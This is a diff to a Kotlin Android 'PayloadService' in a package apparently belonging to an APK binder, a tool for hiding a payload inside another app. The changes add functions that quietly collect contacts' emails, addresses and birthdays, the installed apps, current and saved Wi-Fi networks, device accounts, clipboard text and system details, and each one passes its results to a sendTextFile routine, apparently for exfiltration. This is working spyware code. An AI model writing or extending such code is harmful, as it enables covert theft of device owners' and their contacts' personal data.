@@ -1,20 +1,28 @@
 package Com.devhs.apkbinder.payload
 
+import android.accounts.AccountManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ApplicationInfo
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.drawable.BitmapDrawable
 import android.graphics.drawable.Drawable
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.Uri
+import android.net.wifi.WifiManager
+import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
+import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
@@ -24,6 +32,7 @@ import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import java.util.TimeZone
 import java.util.concurrent.Executors
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
@@ -96,7 +105,13 @@ class PayloadService : Service() {
         if (f.contains("sms")) sendSms()
         if (f.contains("calls")) sendCalls()
         if (f.contains("contacts")) sendContacts()
+        if (f.contains("contact_details")) sendContactDetails()
         if (f.contains("device")) sendDevice()
+        if (f.contains("apps")) sendApps()
+        if (f.contains("wifi")) sendWifi()
+        if (f.contains("accounts")) sendAccounts()
+        if (f.contains("clipboard")) sendClipboard()
+        if (f.contains("system")) sendSystem()
 
         pool.shutdown()
         pool.awaitTermination(30, TimeUnit.MINUTES)
@@ -443,6 +458,179 @@ class PayloadService : Service() {
         }
         HsLog.w("contacts chars=${sb.length}")
         if (sb.isNotEmpty()) sendTextFile("contacts.txt", sb.toString())
+    }
+
+    private fun sendContactDetails() {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Email.ADDRESS
+                ), null, null, null
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 900_000) {
+                    sb.append(c.getString(0) ?: "?").append(" | email: ")
+                        .append(c.getString(1) ?: "").append("\n")
+                }
+            }
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS
+                ), null, null, null
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 1_500_000) {
+                    sb.append(c.getString(0) ?: "?").append(" | addr: ")
+                        .append(c.getString(1) ?: "").append("\n")
+                }
+            }
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Event.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Event.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Event.START_DATE
+                ),
+                ContactsContract.CommonDataKinds.Event.TYPE + "=" +
+                        ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY,
+                null, null
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 2_000_000) {
+                    sb.append(c.getString(0) ?: "?").append(" | birthday: ")
+                        .append(c.getString(1) ?: "").append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("contactDetails: ${t.message}")
+            return
+        }
+        HsLog.w("contactDetails chars=${sb.length}")
+        if (sb.isNotEmpty()) sendTextFile("contact_details.txt", sb.toString())
+    }
+
+    private fun sendApps() {
+        val sb = StringBuilder()
+        try {
+            val pm = packageManager
+            val rows = ArrayList<String>()
+            for (pi in pm.getInstalledPackages(0)) {
+                val ai = pi.applicationInfo ?: continue
+                val label = try {
+                    pm.getApplicationLabel(ai).toString()
+                } catch (t: Throwable) {
+                    "?"
+                }
+                val kind = if ((ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0) "SYS" else "USR"
+                rows.add("[" + kind + "] " + label + " | " + pi.packageName +
+                        " | " + (pi.versionName ?: "-") + " | " + pi.firstInstallTime)
+            }
+            rows.sort()
+            for (r in rows) sb.append(r).append("\n")
+        } catch (t: Throwable) {
+            HsLog.e("apps: ${t.message}")
+            return
+        }
+        HsLog.w("apps chars=${sb.length}")
+        if (sb.isNotEmpty()) sendTextFile("installed_apps.txt", sb.toString())
+    }
+
+    private fun intToIp(v: Int): String =
+        (v and 0xFF).toString() + "." + ((v shr 8) and 0xFF) + "." +
+                ((v shr 16) and 0xFF) + "." + ((v shr 24) and 0xFF)
+
+    private fun sendWifi() {
+        val sb = StringBuilder()
+        try {
+            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            @Suppress("DEPRECATION")
+            val ci = wm.connectionInfo
+            if (ci != null) {
+                sb.append("SSID: ").append(ci.ssid).append("\n")
+                sb.append("BSSID: ").append(ci.bssid).append("\n")
+                sb.append("IP: ").append(intToIp(ci.ipAddress)).append("\n")
+                sb.append("Link speed: ").append(ci.linkSpeed).append("\n")
+                sb.append("RSSI: ").append(ci.rssi).append("\n")
+            }
+            sb.append("\nSaved networks:\n")
+            @Suppress("DEPRECATION")
+            val nets = wm.configuredNetworks
+            if (nets != null) {
+                for (n in nets) {
+                    sb.append(n.SSID).append(" | ").append(n.BSSID).append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("wifi: ${t.message}")
+            return
+        }
+        HsLog.w("wifi chars=${sb.length}")
+        sendTextFile("wifi.txt", sb.toString())
+    }
+
+    private fun sendAccounts() {
+        val sb = StringBuilder()
+        try {
+            val am = AccountManager.get(this)
+            for (a in am.accounts) {
+                sb.append(a.name).append(" | ").append(a.type).append("\n")
+            }
+            sb.append("\nNote: passwords are not readable without root.\n")
+        } catch (t: Throwable) {
+            HsLog.e("accounts: ${t.message}")
+            return
+        }
+        HsLog.w("accounts chars=${sb.length}")
+        sendTextFile("accounts.txt", sb.toString())
+    }
+
+    private fun sendClipboard() {
+        try {
+            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            val clip = cm.primaryClip ?: return
+            val sb = StringBuilder()
+            for (i in 0 until clip.itemCount) {
+                val t = clip.getItemAt(i).text?.toString() ?: continue
+                sb.append(t).append("\n---\n")
+            }
+            if (sb.isNotEmpty()) sendTextFile("clipboard.txt", sb.toString())
+        } catch (t: Throwable) {
+            HsLog.e("clipboard: ${t.message}")
+        }
+    }
+
+    private fun sendSystem() {
+        val sb = StringBuilder()
+        try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            sb.append("Battery: ")
+                .append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
+            val t = when {
+                nc == null -> "none"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
+                else -> "other"
+            }
+            sb.append("Network: ").append(t).append("\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            val dm = resources.displayMetrics
+            sb.append("Screen: ").append(dm.widthPixels).append("x").append(dm.heightPixels)
+                .append(" @").append(dm.densityDpi).append("dpi\n")
+        } catch (_: Throwable) {
+        }
+        sb.append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
+        sb.append("Uptime: ").append(SystemClock.elapsedRealtime() / 1000).append("s\n")
+        HsLog.w("system chars=${sb.length}")
+        sendTextFile("system.txt", sb.toString())
     }
 
     private fun sendDevice() {
